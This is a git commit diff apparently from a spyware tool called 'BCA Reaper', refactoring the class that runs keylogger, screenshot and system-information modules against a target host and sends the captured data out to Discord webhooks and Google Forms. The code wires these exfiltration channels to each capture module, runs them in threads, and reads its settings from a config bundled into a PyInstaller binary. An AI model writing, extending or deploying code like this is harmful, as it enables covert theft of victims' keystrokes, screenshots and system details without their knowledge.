26def58c16481470cdeebc159efd874fc1f98051
EONRaider <livewire_voodoo@protonmail.com>
2021-11-29 08:47:03 -0300

    Reimplement Reaper class
    - Modified 'execute' method
    - Added setters/getters for 'webhook' and
    'google_forms' instance variables
    - Renamed 'modules' property to 'exploitation'
    - Modified CLI parser

--- src/reaper.py
+++ src/reaper.py
@@ -7,6 +7,7 @@ import argparse
 import os
 import platform
 from concurrent.futures import ThreadPoolExecutor
+from functools import partial
 from uuid import uuid4
 
 from src.modules import (
@@ -33,8 +34,31 @@ class Reaper:
             Forms.
         """
         self.exfil_time = exfil_time
+        self._exfiltration = list()
         self.webhook = discord_webhook
         self.forms_url = google_forms_url
+
+    @property
+    def webhook(self) -> [str, None]:
+        return self._webhook
+
+    @webhook.setter
+    def webhook(self, url: [str, None]):
+        if url is not None:
+            discord = partial(Discord, webhook_url=url)
+            self._exfiltration.append(discord)
+        self._webhook = url
+
+    @property
+    def forms_url(self):
+        return self._forms_url
+
+    @forms_url.setter
+    def forms_url(self, url: [str, None]):
+        if url is not None:
+            google_forms = partial(GoogleForms, form_url=url)
+            self._exfiltration.append(google_forms)
+        self._forms_url = url
 
     @property
     def screenshot_path(self) -> str:
@@ -49,12 +73,12 @@ class Reaper:
         if platform.system() == "Windows":
             app_data = os.path.expandvars(r"%LOCALAPPDATA%")
             path = os.path.join(app_data, "Temp", filename)
-        else:  # Linux/Unix/MacOS
+        else:  # Linux/Unix
             path = f"/tmp/{filename}"
         return path
 
     @property
-    def modules(self) -> set[KeyLogger, ScreenShot, SystemInformation]:
+    def exploitation(self) -> set[KeyLogger, ScreenShot, SystemInformation]:
         """Gets a set of initialized ExploitationModule instances."""
         return {
             KeyLogger(exfil_time=self.exfil_time),
@@ -65,18 +89,17 @@ class Reaper:
 
     def execute(self) -> None:
         with ThreadPoolExecutor() as executor:
-            for module in self.modules:
-                Discord(module=module, webhook_url=self.webhook)
-                if type(module) != ScreenShot:
-                    GoogleForms(module=module, form_url=self.forms_url)
-                executor.submit(module.execute)
+            for exploit in self.exploitation:
+                for exfil in self._exfiltration:
+                    exfil(module=exploit)
+                executor.submit(exploit.execute)
 
 
 def parse_cli() -> argparse.Namespace:
     parser = argparse.ArgumentParser(
-        description="BCA Reaper - Log keystrokes, take screenshots, grab "
-                    "system information and exfiltrate to Discord and Google "
-                    "Forms"
+        description="BCA Reaper - Log keystrokes, take screenshots and grab "
+                    "system information from a target host and exfiltrate to "
+                    "Discord and Google Forms"
     )
     parser.add_argument(
         "-w", "--webhook",
@@ -106,24 +129,20 @@ def parse_cli() -> argparse.Namespace:
 if __name__ == "__main__":
     _args = parse_cli()
 
-    if not all((_args.webhook, _args.forms)):
+    try:
         '''Reaper is executed as a binary compiled by PyInstaller. All 
         configuration options are read from the 'config.py' file that 
         is created and bundled in the binary during the build process 
         defined by 'build.py'.'''
         import importlib
-        try:
-            args = importlib.import_module("config")
-        except ModuleNotFoundError:
-            raise SystemExit(
-                "Error: At least one exfiltration method is required to "
-                "run/build the application. Set a Discord webhook and/or a "
-                "Google Forms URL and try again."
-            )
-    else:
-        '''Reaper is executed from source code by the system interpreter 
-        for development purposes. All configuration options are parsed 
-        from the CLI.'''
+        import sys
+        pyinstaller_path = sys._MEIPASS
+        args = importlib.import_module("config")
+        if not (args.webhook or args.forms):
+            raise AttributeError
+    except (ModuleNotFoundError, AttributeError):
+        '''Reaper is executed with configuration options parsed from 
+        the CLI.'''
         args = _args
 
     Reaper(
